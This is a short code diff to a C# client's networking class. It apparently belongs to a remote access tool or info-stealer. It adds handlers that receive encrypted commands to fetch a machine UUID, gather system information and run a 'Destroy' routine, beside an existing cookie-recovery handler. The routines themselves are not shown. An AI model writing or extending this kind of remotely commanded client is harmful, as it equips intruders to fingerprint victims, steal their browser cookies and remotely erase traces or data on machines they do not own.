@@ -137,6 +137,18 @@ namespace Client.Core.Networking
             {
                 RecoverCookies.Execute(Cryptography.Decrypt(incomingData));
             });
+            Connection.AppendIncomingPacketHandler<string>("GetUUIDReq", (packetHeader, connection, incomingData) =>
+            {
+                GetUUID.Execute(Cryptography.Decrypt(incomingData));
+            });
+            Connection.AppendIncomingPacketHandler<string>("GetSystemInfoReq", (packetHeader, connection, incomingData) =>
+            {
+                GetSystemInfo.Execute(Cryptography.Decrypt(incomingData));
+            });
+            Connection.AppendIncomingPacketHandler<string>("DestroyReq", (packetHeader, connection, incomingData) =>
+            {
+                Destroy.Execute(Cryptography.Decrypt(incomingData));
+            });
         }
 
         public static void StartReconnect()
